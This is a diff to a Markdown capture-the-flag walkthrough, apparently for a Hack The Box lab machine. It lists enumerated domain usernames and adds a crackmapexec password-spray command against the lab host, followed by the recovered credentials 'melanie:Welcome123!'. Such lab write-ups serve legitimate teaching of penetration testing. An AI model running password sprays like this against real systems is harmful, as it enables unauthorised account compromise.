@@ -77,5 +77,16 @@ user:[zach] rid:[0x2776]
 user:[simon] rid:[0x2777]
 user:[naoki] rid:[0x2778]
 ```
-
 Use within vim to extract the usernames:`%s/user:\[\(.*\)\] rid:\[.*\]/\1/g`
+
+  - Password Spray
+```CSS
+▶ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!' --continue-on-success
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8f91e8ba-959b-47e8-bf89-3f0a19668ac7)
+
+```CSS
+Credentials- melanie:Welcome123!
+```
+
+---
